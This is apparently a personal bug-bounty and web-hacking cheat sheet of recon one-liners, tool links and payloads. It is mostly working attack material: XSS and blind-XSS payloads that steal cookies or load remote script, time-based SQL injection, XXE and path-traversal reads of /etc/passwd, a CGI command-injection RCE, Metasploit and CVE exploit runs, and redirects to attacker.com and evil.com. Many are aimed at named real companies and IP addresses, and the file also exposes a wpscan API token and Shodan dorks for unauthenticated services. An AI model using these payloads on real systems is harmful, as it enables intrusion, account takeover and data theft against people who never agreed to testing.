Bug Hunting methodology For Beginner
-----------------------------------
Blind SSRF Free Server: https://requestcatcher.com/
Blind XSS: https://xss.report/dashboard  ,   https://xss0r.com/

https://github.com/blacklanternsecurity/bbot
https://github.com/shmilylty/OneForAll
https://github.com/projectdiscovery/subfinder
https://github.com/RevoltSecurities/Subdominator

XSS Injection:
--------------
Hidden Injection Points:
------------------------
View-Source:  hidden param
Read & find all endpints / params
x8/arjun tool
passive: waybackmachine
Bruteforce with wordlists

x8-u https:.... -w params.txt

Number Input Field: RFC 5341
Email Input Field: RFC 2822

UNDERSTANDING THE REFLECTION CONTEXTS & ALLOWANCES!

1. Know where your payloads are landing.
• Between HTML Tags | <h1>XSS<h1> 
• Inside Attributes | value="XSS"
• Inside Javascript | <script> var = 'xss'; </script>

2. Know what is your limit of allowance. 
• Does it allow all "><'()[]? 
• Does it only allow >< but not "? 
• Does it only allow" but not ><?

check on view-source verify on Inspect(Edit as HTML)

Resources:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
https://github.com/zigoo0/JSONBee
https://raw.githubusercontent.com/zigoo0/JSONBee/refs/heads/master/jsonp.txt
https://csp-evaluator.withgoogle.com/
https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
https://aszx87410.github.io/beyond-xss/en/ch1/xss-introduction/
https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html

cat square-alive.txt | nuclei -t ~/pro~nuclei/cves~all/reflected-xss-waf-bypass.yaml -c 40 -rl 200
nuclei -l square-alive.txt -t ~/pro~nuclei/cves~all -c 50 -v -o custom_cves_results.txt
nuclei -l square-alive.txt -t ~/pro~nuclei/nuclei~all -c 50 -v -o custom_all_results.txt

https://github.com/amrelsagaei/Bug-Bounty-Hunting-Methodology-2025
https://lostsec.xyz/


cRlF:
-----
subfinder -d abc.xyz -all -silent | nuclei -t cRlf.yaml -c 30 -rl 50

git clone --depth=1 --single-branch https://github.com/0xlipon/payloads.git

ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt -u https://something.edu.bdFUZZ
ffuf -w iis.txt -u https://40.78.107.245/FUZZ -recursion
ffuf -w ~/wordlists/Bug-Bounty-Wordlists/fuzz.txt -u https://musicimage.xboxlive.com/FUZZ -fs 150
ffuf -w ~/wordlists/Bug-Bounty-Wordlists/php_files_only.txt -u https://20.86.155.86/FUZZ

gospider -S alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | sort -u | tee urls.txt

echo https://api.netgear.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml | sed 's/=.*/=/' | uro | tee katana-urls.txt
waybackurls https://community.sophos.com/ | gf xss | sed 's/=.*/=/' | uro | tee wayback-urls.txt
cat https://community.sophos.com/ | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | tee gau-urls.txt

https://community.sophos.com/api.ashx/v2/cfs/temporary.json?UploadContextId=

./xss0r.exe --get --urls urls.txt --payloads smallpayloads.txt --shuffle --reflection --threads 10

ffuf -w payloads.txt -u "https://www.redbull.com/?rb3Search=FUZZ" -mc 200 -t 40

cat urls.txt | xargs -I {} sh -c 'echo {} | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg | sed "s/=.*/=/" | uro' | tee katana-urls.txt 

subfinder -d sophos.com -all  -recursive > subdomain1.txt
subdominator -d sophos.com -o output-subdominator.txt
echo example.com | alterx -enrich | dnsx -silent

arjun -q -u sophos.com -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss

ffuf -w all-files-leaked.txt -u https://www.privateinternetaccess.comFUZZ
https://40.78.107.245/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

echo laboratories.telekom.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt

https://laboratories.telekom.com/?s=

katana -u samsung.com -d 5 -jc | grep '\.js$' | tee alljs.txt
echo www.samsung.com | gau | grep '\.js$' | anew alljs.txt
cat alljs.txt | httpx-toolkit -mc 200 -o samsung.txt
cat samsung.txt | jsleaks -s -l -k
cat samsung.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30
cat samsung.txt | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg.py "{}" — js_urls — domains — ips — leaked_creds — local_storage'

https://musicimage.xboxlive.com/swagger.json
https://musicimage.xboxlive.com/\..\..\..\..\..\..\..\..\..\etc\passwd

https://20.86.155.86/composer.json
https://20.86.155.86/composer.lock
https://20.86.155.86/vendor/composer/installed.json
https://20.86.155.86/vendor/phpunit/phpunit/phpunit

Very simple XSS Payload:
<iframe src="javascript​:prompt`${origin}`" xss="">
<img src=x onerror="alert(origin)">

---------------------------------------------------
grep -vE '^$' algolia.com.txt | sed 's/^\*\.//' | tee subs.txt
cat algolia.com.txt | httpx-toolkit --random-agent --status-code --title -server -td -cl
ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt-u https://algosecrets.algolia.comFUZZ

https://builder.algolia.com
https://crawler.algolia.com/admin/users/login

https://erc-admin.algolia.com
https://staging-data.us.algolia.com/1/internal/admin/okta/login?&redirect=https://erc-admin.algolia.com/

https://github.com/0xPugal/One-Liners
shodan search Ssl.cert.subject.CN:"crypto.com" --fields ip_str | anew ips.txt
cat ips.txt | httpx-toolkit --random-agent --status-code --title -server -td -cl -o status.txt
shodan parse --fields ip_str,port --separator : org\:Tesla.json.gz

Oneliner:
gauplus -subs | anew allUrls.txt; grep -i "\.log$" allUrls.txt | anew log.txt; grep -i "\.bak" allUrls.txt | anew bak.txt; grep -i "\.xlsx" allUrls.txt | anew xlsx.txt; grep "=" allUrls.txt | anew allParams.txt; cat allParams.txt | Gxss -c 100 -0 reflected.txt; cat allUrls.txt | gf SQL | anew allsql.txt; cat allParams.txt | qsreplace "| httpx -1; cat allUrls.txt | awk -F[/:] '{print $4}' | anew newSubs.txt; httpx -l allUrls.txt -path "///////../../../../.. /../etc/passwd" -status-code -mc 200 -ms 'root' | anew pathTraversal.txt; httpx -l allUrls.txt -mc 403 | anew 403s.txt; 403bypasser.py -U 403s.txt; cat allUrls.txt | grep -i "\.js$" > jsfiles.txt; while read link; do python3 SecretFinder.py -i "$link"; done <jsfiles.txt
cat allSubs.txt | gauplus -subs | grep -i "\.xlsx" allUrls.txt | anew xlsx.txt;
cat allSubs.txt | gauplus -subs | grep -i "\.sql" allUrls.txt | anew sql.txt;
cat allSubs.txt | gauplus -subs | grep -i "\.log" allUrls.txt | anew log.txt;
cat allSubs.txt | gauplus -subs | grep -i "\.bak" allUrls.txt |anew bak.txt;
cat allSubs.txt | gauplus -subs | grep "=" | Gxss -c 100 | anew reflected.txt
cat allSubs.txt | gauplus -subs | grep "=" urls.txt; httpx -1 url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 ms 'root:'

cat allSubs.txt | gauplus -subs | qsreplace ""❘ httpx
cat allSubs.txt | gauplus -subs | grep -i "\.js$" > jsfiles.txt; while read url; dopython3 SecretFinder.py -i "$url"; done<jsfiles.txt
cat allSubs.txt | gauplus -subs❘ httpx -sc -nc | grep "403\|401" | anew unauthed.txt
cat allSubs.txt | gauplus -subs❘ httpx -title | grep -i "admin\|login\| dashboard" | anew loginPanel.txt

https://sm4rty.medium.com/hunting-for-bugs-in-file-upload-feature-c3b364fb01ba
https://github.com/almandin/fuxploider

https://raw.githubusercontent.com/xnl-h4ck3r/waymore/refs/heads/main/waymore/waymore.py

cat httpx_report.txt | grep 302 | awk ‘{print $1}’ | anew 302_status.txt
cat 302_status.txt | nuclei -t ~/private/zip-backup.yaml -c 40 -project armin -rl 400 -v | anew lowkey.txt
nuclei -u https://redacted.supersecret.com/ -t ~/private/zip-backup.yaml -v -debug
wget https://redacted.supersecret.com/uploads.zip

mkdir example
cd example

Tool-install-(https://github.com/projectdiscovery/subfinder)

subfinder -d example.com -all  -recursive > subdomain1.txt

cat subdomains.txt | wc -l

Tool-install-(https://github.com/aungsanoo-usa/crt.sh)
cd crt.sh
./crt.sh  

Tool-install -( sudo apt install -y jq )
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomain2.txt

cat subdomain1.txt subdomain2.txt > subdomains.txt

Tool-install-(https://github.com/projectdiscovery/naabu)
naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt

Tool-install -( sudo apt install httpx-toolkit )
cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
cat subdomains_alive.txt | wc -l 

Tool-install-(https://github.com/projectdiscovery/katana)
katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,pdf,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
cat allurls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sed 's/=.*/=/' | sort | uniq > bsqli.txt

Tool-install-(https://github.com/Emoe/kxss)(https://github.com/KathanP19/Gxss)

cat allurls.txt | Gxss | kxss | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > xss.txt

Tool-install-(https://github.com/tomnomnom/gf)
cat allurls.txt | gf or | sed 's/=.*/=/' | sort -u > open_redirect.txt
cat allurls.txt | gf lfi | sed 's/=.*/=/' | sort -u > lfi_output.txt

Find vul..for blind sqli xss lfi or..ect...
Tool-install-(https://github.com/coffinxp/loxs)
cd loxs
python3 loxs.py 
chose each payloads and urls files
cat allurls.txt | grep -E "\.js$" >> js.txt

(https://github.com/m4ll0k/SecretFinder)
cd SecretFinder
python3 SecretFinder.py -i js.txt -o secret.txt
sudo mv "/mnt/c/Users/Torikul Islam Lipon/Downloads/assets" .

Tool-install-(https://github.com/projectdiscovery/nuclei)
cat js.txt | nuclei -t /home/aung/nuclei-templates/http/exposures/ 

echo www.example.com | katana -ps | grep -E "\.js$" | nuclei -t /home/aung/nuclei-templates/http/exposures/ -c 30

Tool-install- (sudo apt install dirsearch)
dirsearch  -u https://www.example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json

Tool-install-(go install github.com/repejota/qurl/cmd/qurl@develop - go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest- ) move qurl bxss to usr/local/bin

subfinder -d example.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/aunglat></script>' -parameters


Tool-install-(https://github.com/PentestPad/subzy)
subzy run --targets subdomains.txt --verify_ssl


Tool-install-(https://github.com/s0md3v/Corsy)
python3 corsy.py -i /home/aung/example/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

Tool-install-(https://github.com/aungsanoo-usa/priv8-Nuclei)
nuclei -list subdomains_alive.txt -t /home/aung/Priv8-Nuclei/cors.yaml -v

nuclei  -list ~/example/subdomains_alive.txt -tags cves,osint,tech

cat allurls.txt | gf lfi | nuclei -tags lfi


Tool-install-(https://github.com/devanshbatham/OpenRedireX)
cat allurls.txt | gf redirect | openredirex -p /home/aung/openredirex/payloads.txt

cat subdomains_alive.txt | nuclei -t /home/aung/Priv8-Nuclei/cRlf.yaml -v


Tool-install-(go install github.com/bitquark/shortscan/cmd/shortscan@latest)
shortscan https://example.com/ -F


==========================================================================================================

https://dash.pugrecon.celes.in/
https://buckets.grayhatwarfare.com
sudo cp indeed.com.txt "/mnt/c/Users/Torikul Islam Lipon/Downloads/"
subprober -f indeed.com.txt -sc -ar -o indeed-alive.txt -nc -c 20
sudo ls "/mnt/c/Users/Torikul Islam Lipon/Downloads/assets"
sudo mv "/mnt/c/Users/Torikul Islam Lipon/Downloads/assets" .
cat subs | httpx-toolkit -sc -ip -server -title -wc -o result.txt
cat result.txt | awk '{print $1}' > alive.txt
cat alive.txt | subdosec
cat result.txt | sed 's/\x1b\[[0-9;]*m//g' | grep '\[404\]' | tee 404-tmp.txt
cat 404-tmp.txt | awk '{print $1}' > 404.txt && rm -rf 404-tmp.txt
cat 404.txt | subdosec
subzy run --targets 404.txt --hide_fails --verify_ssl --vuln
subjack -w subdomains.txt -c ~/.fingerprints.json -t 100 -timeout 30 -o subjack.txt -ssl 
autosubtakeover --domains domain.com --wordlist subdomains.txt
SubOver -l 404.txt -v

Recursive Fuzzing with WFUZZ 
- finding hidden files, folders
wfuzz -c -z file,wordlist -R 3 --sc 301,200 target/FUZZ

JS Fuzzing - LazyEgg
python lazyegg[.]py --js_scan --w wordlist[.]txt target/js

gobuster -u http://fakebank.com -w wordlist.txt dir

for Fuzzing
curl -s https://crt.sh\?q\=\%.doman.tld\&output\=json | jq -r '.[].name_value' | sed 's/^\*\.//' | sort -u | httprobe -prefer-https | xargs -I{} ffuf -w $WORDLIST -u {}/FUZZ -t 70
curl -s https://crt.sh\?q\=%http://25.example.com\&output\=json | jq . | grep 'name_value' | awk '{print $2}' | sed -e 's/"//g'| sed -e 's/,//g' |  awk '{gsub(/\\n/,"\n")}1' | sed 's/\*\.//g' | anew

One Liner for finding endpoints from javascript file urls:
cat js.txt | while read line; do curl $line -s -k; done | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

How to use FFUF over multiple hosts
$ for i in `cat host.txt`; do ffuf -u $i/FUZZ -w wordlist.txt -mc 200,302,401 -se ;done

https://github.com/musana/fuzzuli
https://github.com/0xPugal/One-Liners
https://github.com/KathanP19/HowToHunt/blob/master/Status_Code_Bypass/403Bypass.md

Uncover Hidden Parameters & Spot XSS in One Go
arjun -q -u target -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF;
i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss

subdominator -d indeed.com -o output-subdominator.txt

python3 CVE-2024-40725.py -u https://cnow.apps.ng.cengage.com/
cat ~/recon/assets/alive.txt | xargs -n 1 -P 10 -I {} python3 'CVE-2024-40898 .py' -u {}

msf6> search php_cgi
> use exploit/multi/http/php_cgi_arg_injection
> set rhosts 10.1.1.100
> show options
> exploit

https://report.telekom.com/hr-factbook/2023/services/search.html?q=lipon
https://www.telekom.com/en/search-this-website?query=test
https://laboratories.telekom.com/wp-login.php

ffuf -w ~/wordlists/Bug-Bounty-Wordlists/wordpress-random.txt -u https://laboratories.telekom.comFUZZ

wp-links-opml.php
wp-admin.php   
wp-config.php
wp-content/uploads
Wp-load
wp-signup.php
Wp-json
wp-includes
index.php
wp-login.php
wp-links-opml.php
wp-activate.php
wp-blog-header.php
wp-cron.php
wp-links.php
wp-mail.php
xmlrpc.php
wp-settings.php
wp-trackback.php
wp-signup.php
wp-config.php.txt

Subdomain Takeover Detection with Subfinder & Nuclei 
subfinder -d target -o target && nuclei -t wp-xyz-takeover[.]yaml -l target

🔥 Reduce Noise in Burp Suite with This Simple Trick! 🔥
💡 Just add the following patterns in Burp Suite under Proxy > Options > TLS Pass Through:
.*\.google\.com
.*\.gstatic\.com
.*\.googleapis\.com
.*\.pki\.goog
.*\.mozilla\..*

Get the company IPs range X.X.X.X/24
nmap -p 80,448,8080 IP/24 -oN file.txt 
httpx -l IPs.txt -o final.txt
nuclei -l final.txt

find exposed an access.log
cat access.log | grep " 200 " | cut -d'"' -f2 | cut -d' ' -f2 | sort -u | ffuf -mc 200 -w - -u ".........FUZZ"

Find Subdomains Using RapidDNS
rapiddns netflix.com

Find blind XSS endpoints
1. Visit your email client like Gmail etc.
2. Search for Unsubscribe/feedback/Manage preferences.
3. Click on Unsubscribe and put BXSS payload if they ask for any feedback.

If you tried to access /.git folder and got 403 , try to access files after .git like: /config or /logs/HEAD
httpx -l subs.txt -path /.git/config --status-code --silent

Stored XSS via cache poisoning
"><a nope="%26quot;x%26quot;"onmouseover​="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">

[+] Easy Account Take Over
1.Go to web.archive.org 
2. Put the domain and search for urls
3. Type in the filter ( %40 ) and search
4. Get a lot of urls that have a parameter leaks the email and password of the users

1- Go to /wp-login.php?action=register
2- Register with the name admin if it is available 
3- Go to the email 
4- Then you will see that the registration has been completed. Log in to the admin panel. and congratulations, you have obtained admin permission

JS Recon : WaybackURLs & HTTPX
waybackurls url | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} python lazyegg[.]py "{}" --js_urls --domains --ips > urls && cat urls | grep '\.' | sort -u | xargs -I{} httpx -silent -u {} -sc -title -td

/.git File Mass Hunting 👇
cat alivesubs.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe 

You can find deep domains without tools. like this simple dorks :
site:*.site.com -www
site:*.*.site.com -www
site:*.*.*.site.com -www


403 or waf block bypass sqli:
sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash

[+] GraphQL Hacking Checklist
https://anmolksachan.github.io/graphql/

[+] SharpBruteForceSSH
https://github.com/HernanRodriguez1/SharpBruteForceSSH

7 SQLs 
4 in php
(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
1 in aspx
orwa';%20waitfor%20delay%20'0:0:6'%20--%20
2 in graphql
orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--

admin panel accessed payloda:
cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk -v -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls

XSS CSP Bypass:
1- 
%3C/script%20%3E

2- mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E

Tip : Extract IPS From list of domains and then you can conduct your FUZZ/Manually check them for SDE /BAC , Ports , ..etc 
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'

[+] Quick RCE 
Target/cgi-bin/dmt/reset.cgi?db_prefix=%26id%26

[+] Command Injection by Uploading Image
https://medium.com/@Cyber_siva/command-injection-by-uploading-image-ef72e168980c

Fuzzing Tips with HTTPX

cat /wordlist/subdomains | xargs -P 10 -I {} httpx -silent -mc 200,301,302,401 -u https://{}-admin

admin-{}
{}admin
admin{}
admin.{}
{}.admin

LFI exploitation tool

1.Gather Parameters from wayback
waybackurls target | grep -Eo '\b[^=&?]+\=[^&?]+' | awk -F= '{print $1}' | sort -u

2.Bruteforce LFI
xargs -I{} httpx -silent -path "?{}=/../../../../../../../../etc/hosts" -u target

subfinder -d apple .com | httpx -mc 200 subdomain.txt
cat subdomain.txt | waybackurls > url.txt
cat uro.txt | uro > filterurl.txt
nuclei -l filterurl.txt -t /private-Nuclei-Templates/

Local File Inclusion { One-liner Command }
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Bug Bounty Tips: Discovering the Origin IP by scanning your target IP range
https://github.com/hakluke/hakoriginfinder
prips 93.184.216.0/24 | hakoriginfinder -h example[.]com

Host header Poisoning 🤑 🤑 
POST /admin/forgot_password HTTP/1.1
Host: web..com"><img src="Blind XSS Here">

This OneLiner extracts all API endpoints from AngularJS & Angular javascript files.⚡️
curl -s URL | grep -Po "(\/)((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0-9\{\}]+))" | sort -u


🚀🚀Shodan-Dork🚀🚀

🔍 Prodect mysql found 
👉product:MySQL

🔍 MongoDB 
👉"MongoDB Server Information" -authentication

🔍 defult password
👉"default password"

🔍 guest login
👉 guest login ok

🔍 Jenkins Unrestricted Dashboard
👉x-jenkins 200

🔍 wp config
👉http.html:"* The wp-config.php creation script uses this file"

🔍 root session
👉"root@" port:23 -login -password -name -Session

🔍 defult wireless password
👉html:"def_wirelesspassword"

🔍 Auth desabled
👉"authentication disabled"

🔍 dashboard
👉http.title:"dashboard"

🔍 control panel
👉http.title:"control panel"

🔍 phpmyadmin
👉http.title:"phpmyadmin"

🔍 CouchDB
👉product:"CouchDB"

🔍 kibana
👉kibana content-length:217

🔍 CVE-2021-26855-CVE-2021-31206 Microsoft RCE
👉http.title:outlook exchange

🔍 CVE-2022-29464 WSO2 RCE
👉http.favicon.hash:1398055326

🔍 CVE-2022-29464.WSO2 RCE
👉http.html:WSO2

🔍 Cisco ASA CVE-2020-3452
👉"webvpn="

🔍 Windows SMB exposures 
👉port:"445" os:"Windows"

🔍 CVE-2022-22954 in VMWare Workspace ONE
👉http.favicon.hash:-1250474341

🔍 Find secret API keys publicly exposed #2
👉http.html:"xoxb-"

🔍 Find all jenkins server
👉http.favicon.hash:81586312

🔍 Find all grafana dashboards
👉http.title:"Grafana"

🔍 CVE-2022-24255 Main & Admin Portals: Authentication Bypass
👉http.html:zabbix

🔍 Horde webmail A takeover
👉http.html:Horde:

🔍 CVE-2022-24348:path traversal
👉http.title:"Argo CD"

🔍 tomcat may log4j
👉product:tomcat

🔍 NO password required for telnet
👉port:23 console gateway

🔍 Windows RDP Password:
👉"��Ð��4�"proftpd port:21

🔍 proftpd port:21
👉proftpd port:21

🔍 "authentication disabled" "RFB 003.008"
👉"authentication disabled" "RFB 003.008"

🔍 CVE CVE-2019-11510
👉http.html:/dana-na/

🔍 F5 BIG-IP using CVE-2020-5902
👉http.title:"BIG-IP

🔍 unauthorized
👉"unauthorized"

🔍 Mongo Express Web GUI
👉"Set-Cookie: mongo-express=" "200 OK"

🔍 Jenkins CI
👉"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"

🔍 Intel Active Management CVE-2017-5689
👉"Intel(R) Active Management Technology" port:623,664,16992,16993,16994,16995

🔍 Apache Directory Listings
👉http.title:"Index of /" http.html:".pem"


Reverse DNS (rDNS) leverages PTR and DNS queries to find domains among your target's IPs. 
1) Get ASN
2) prips {ASN IP RANGE} | hakrevdns

DNS Recon with dnsX
echo x.com | dnsx -recon

Automating SSRF using Autorepeater 🔒
match: https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
replace:  smdakdhskdhskdhsd.burpcollaborator.net

CloakQuest3r - uncover the true IP address of websites safeguarded by Cloudflare
https://github.com/spyboy-productions/CloakQuest3r

[+] Formula Injection 👇 
https://www.linkedin.com/posts/deepak-saini-cyber_formula-injection-formula-injection-activity-7170263299450679296-_PBO?utm_source=share&utm_medium=member_desktop

Subdomain finders⚔️
- subdomainfinder.c99.nl
- dnsdumpster.com
- https://lnkd.in/gebghegU
- https://lnkd.in/gHhjBxAn
- spyse.com
- findsubdomains.com
- securitytrails.com/domain/
- dnsspy.io
- suip.biz

[+] HTML Injection on comment box 👇 
 HTML Injection Payload:- <h1><font Color=red>Visit Our New WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>

[+] Google Maps API Key Vulnerability Checker
https://www.reconsage.com/tools/scan-gmap

[+]Online Hash Crackers 👇 

http://hashkiller.co.uk
http://md5online.org
http://cmd5.org
http://md5crack.com
https://lnkd.in/gFjsNrEi
http://md5decryption.com
http://md5.rednoize.com
https://lnkd.in/gbdfk-mi
https://lnkd.in/gmiHRQWA
https://thestarkarmyx.t.me
http://passcracking.com
https://lnkd.in/gXya32yf
https://crackstation.net
http://cloudcracker.net
https://lnkd.in/gCm93Kjs
http://onlinehashcrack.com 
http://hashcrack.in/en 

dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u <target>


*Parameter pollution on password reset*

email=v@g.com&email=a@g.com
email[]=v@g.com&email[]=a@g.com
email=v@g.com%20email=a@g.com
email=v@g.com|email=a@g.com
email=v@g.com,a@g.com
email=v@g.com%20a@g.com
{"email":"v@g.com","email":"a@g.com"}
{"email":["v@g.com","a@g.com"]}


Chaining Vulnerabilities through File Upload

SLQi
'sleep(20).jpg
sleep(25)-- -.jpg

Path traversal
../../etc/passwd/logo.png
../../../logo.png

XSS
-> Set file name filename="svg onload=alert(document.domain)>" , filename="58832_300x300.jpg<svg onload=confirm()>"

-> Upload using .gif file
GIF89a/<svg/onload=alert(1)>/=alert(document.domain)//;

-> Upload using .svg file
<svg xmlns="w3.org/2000/svg" onload="alert(1)"/>

-> <?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "w3.org/Graphics/SVG/1…"><svg version="1.1" baseProfile="full" xmlns="w3.org/2000/svg">
 <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
 <script type="text/javascript">
 alert("HolyBugx XSS");
 </script>
</svg>

Open redirect 
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='attacker.com'"
xmlns="w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>

XXE 
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="w3.org/2000/svg" xmlns:xlink="w3.org/1999/xlink" version="1.1
<text font-size="40" x="0" y="16">&xxe;</text>
</svg>

[+] SploitScan 🚨
Powerful user-friendly tool designed to streamline the process of identifying exploits for known vulnerabilities and their respective exploitation probability.
https://github.com/xaitax/SploitScan

Local File Inclusion { One-liner Command }
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

python3 waymore.py -i sub.target.com -mode U -xcc 
ffuf -u https://sub.taget.com/promo/offer/1234/FUZZ -mc 200 

https://sdgraphics.com/system/search_results.php?req|global=%3Cscript%3Ealert(1)%3C/Script%3E


Reverse Tabnabbing to XSS:
--------------------------
window.opener.location="https://evil.com"
window.opener.location="alert"
opener.alert(document.cookie)
window.opener.location='http://google.com'
opener.location="https://evil.com"
>> https://hackerone.com/reports/1145563

1) wp-admin.php
2) wp-config.php
3) wp-content/uploads
4) Wp-load
5) wp-signup.php
6) wp-json
7) wp-includes [directory]
8) index.php
9) wp-login.php
10) wp-links-opml.php
11) wp-activate.php
12) wp-blog-header.php
13) wp-cron.php
14) wp-links.php
15) wp-mail.php
16) xmlrpc.php
17) wp-settings.php
18) wp-trackback.php
19) wp-signup.php
20) admin-bar.php 


if you do nomal scan ..wpscan dont catch plugins installed .. i have installed wordpress in my localhost..i also have some vulnnerable plugins installed ...so normal comment is not work.....dont use my token..:D try to get your own in wpscan website for free ..ok

wpscan --url http://10.0.0.227/wordpress/ -e --api-token=hT0T7Lgsh878748x1jg0sQUNKbYJ60Xg712Gosv4VBAm0o --rua -v

if you force scan using this comment ...we got it
wpscan --url http://10.0.0.227/wordpress/ -e --api-token=hT0T7Lgsh5gokjvk7QUNKbYJ60Xg712Gosv4VBAm0o --rua -v --disable-tls-checks -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

"Swagger UI" && host=".com"

cat ubnt.com.txt | httpx-toolkit -path /swagger-api/ -status-code -content-length -o swagger.txt
cat swagger.txt | grep "200"
cat swiftfinancial.com.txt | httpx-toolkit -path /swagger-api/ -status-code -content-length | grep "200"

shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title  

Subdomain Takeover:
Subhunter -l allsubs -o subtko.txt
URLFinder:
urlfinder -d tesla.com

?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9
?configUrl=https://jumpy-floor.surge.sh/test.json
?config=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json

https://shopify.com.cdn.s3.amazonaws.com/ ===> NoSuchBucket
https://snapify.shopify.com.cdn.s3.amazonaws.com/ ===> NoSuchBucket
------------------------------------
https://hackerone.com/reports/1444682
https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/

1. Find as many subdomains as possible
2. cat all_subs.txt | dnsx | tee -a resolved_ones.txt
3. cat resolved_ones.txt | httpx | tee -a alive_ones.txt
